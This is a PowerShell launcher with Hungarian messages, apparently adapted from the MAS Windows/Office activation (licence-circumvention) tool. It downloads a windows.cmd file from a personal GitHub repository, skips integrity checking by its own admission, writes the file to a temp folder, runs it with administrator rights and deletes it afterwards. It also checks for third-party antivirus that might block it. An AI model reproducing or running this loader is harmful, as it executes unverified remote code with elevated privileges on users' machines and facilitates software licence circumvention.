if (-not $args) {
    Write-Host ''
    Write-Host 'Inditas: ' -NoNewline
    Write-Host 'Szemelyre szabott Aktivator (Menuvel)' -ForegroundColor Green
    Write-Host ''
}

& {
    $psv = (Get-Host).Version.Major
    $troubleshoot = 'https://massgrave.dev/troubleshoot'

    # Nyelvi mód ellenőrzése
    if ($ExecutionContext.SessionState.LanguageMode.value__ -ne 0) {
        $ExecutionContext.SessionState.LanguageMode
        Write-Host "PowerShell nem fut teljes nyelvi módban (Full Language Mode)."
        Write-Host "Segítség - https://gravesoft.dev/fix_powershell" -ForegroundColor White -BackgroundColor Blue
        return
    }

    # .NET parancs betöltésének ellenőrzése
    try {
        [void][System.AppDomain]::CurrentDomain.GetAssemblies(); [void][System.Math]::Sqrt(144)
    }
    catch {
        Write-Host "Hiba: $($_.Exception.Message)" -ForegroundColor Red
        Write-Host "A Powershell nem tudta betölteni a .NET parancsot."
        Write-Host "Segítség - https://gravesoft.dev/in-place_repair_upgrade" -ForegroundColor White -BackgroundColor Blue
        return
    }

    # Harmadik féltől származó AV ellenőrzése
    function Check3rdAV {
        $cmd = if ($psv -ge 3) { 'Get-CimInstance' } else { 'Get-WmiObject' }
        $avList = & $cmd -Namespace root\SecurityCenter2 -Class AntiVirusProduct | Where-Object { $_.displayName -notlike '*windows*' } | Select-Object -ExpandProperty displayName

        if ($avList) {
            Write-Host 'Harmadik féltől származó vírusirtó blokkolhatja a szkriptet - ' -ForegroundColor White -BackgroundColor Blue -NoNewline
            Write-Host " $($avList -join ', ')" -ForegroundColor DarkRed -BackgroundColor White
        }
    }

    # Fájl ellenőrzése
    function CheckFile {
        param ([string]$FilePath)
        if (-not (Test-Path $FilePath)) {
            Check3rdAV
            Write-Host "Nem sikerült létrehozni a CMD fájlt az ideiglenes mappában, megszakítás!"
            Write-Host "Segítség - $troubleshoot" -ForegroundColor White -BackgroundColor Blue
            throw
        }
    }

    try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}

    # A TE CMD FÁJLOD CÍME
    $URLs = @(
        'https://raw.githubusercontent.com/Balazsasd01/gasA9ayicri/refs/heads/main/windows.cmd'
    )
    
    Write-Progress -Activity "Letöltés..." -Status "Kérlek várj"
    $errors = @()
    foreach ($URL in $URLs | Sort-Object { Get-Random }) {
        try {
            if ($psv -ge 3) {
                $response = Invoke-RestMethod $URL
            }
            else {
                $w = New-Object Net.WebClient
                $response = $w.DownloadString($URL)
            }
            break
        }
        catch {
            $errors += $_
        }
    }
    Write-Progress -Activity "Letöltés..." -Status "Kész" -Completed

    if (-not $response) {
        Check3rdAV
        foreach ($err in $errors) {
            Write-Host "Hiba: $($err.Exception.Message)" -ForegroundColor Red
        }
        Write-Host "Nem sikerült letölteni a szkriptet, megszakítás!"
        Write-Host "Ellenőrizd, hogy a vírusirtó vagy a tűzfal blokkolja-e a kapcsolatot."
        Write-Host "Segítség - $troubleshoot" -ForegroundColor White -BackgroundColor Blue
        return
    }

    # Integritás ellenőrzés kihagyva, mivel egyedi szkriptről van szó.

    # Autorun registry ellenőrzése
    $paths = "HKCU:\SOFTWARE\Microsoft\Command Processor", "HKLM:\SOFTWARE\Microsoft\Command Processor"
    foreach ($path in $paths) { 
        if (Get-ItemProperty -Path $path -Name "Autorun" -ErrorAction SilentlyContinue) { 
            Write-Warning "Autorun registryt találtunk, a CMD összeomolhat! `nManuálisan másold be az alábbi parancsot a javításhoz:`nRemove-ItemProperty -Path '$path' -Name 'Autorun'"
        } 
    }

    $rand = [Guid]::NewGuid().Guid
    $isAdmin = [bool]([Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544')
    $FilePath = if ($isAdmin) { "$env:SystemRoot\Temp\MAS_$rand.cmd" } else { "$env:USERPROFILE\AppData\Local\Temp\MAS_$rand.cmd" }
    
    # Fontos: ASCII kódolással mentjük
    Set-Content -Path $FilePath -Value "@::: $rand `r`n$response" -Encoding Ascii
    CheckFile $FilePath

    $env:ComSpec = "$env:SystemRoot\system32\cmd.exe"
    $chkcmd = & $env:ComSpec /c "echo CMD is working"
    if ($chkcmd -notcontains "CMD is working") {
        Write-Warning "cmd.exe nem működik.`nReport this issue at $troubleshoot"
    }
    
    # FIGYELEM: NINCSENEK KEMÉNYEN KÓDOLT /Ohook /S ARGUMENTUMOK, ÍGY A MENÜ FOG MEGJELENNI!

    if ($psv -lt 3) {
        if (Test-Path "$env:SystemRoot\Sysnative") {
            Write-Warning "A parancs x86 Powershell-el fut, indítsd x64 Powershell-el helyette..."
            return
        }
        $p = saps -FilePath $env:ComSpec -ArgumentList "/c """"$FilePath"" -el -qedit $args""" -Verb RunAs -PassThru
        $p.WaitForExit()
    }
    else {
        saps -FilePath $env:ComSpec -ArgumentList "/c """"$FilePath"" -el $args""" -Wait -Verb RunAs
    }	
    CheckFile $FilePath

    $FilePaths = @("$env:SystemRoot\Temp\MAS*.cmd", "$env:USERPROFILE\AppData\Local\Temp\MAS*.cmd")
    foreach ($FilePath in $FilePaths) { Get-Item $FilePath -ErrorAction SilentlyContinue | Remove-Item }
} @args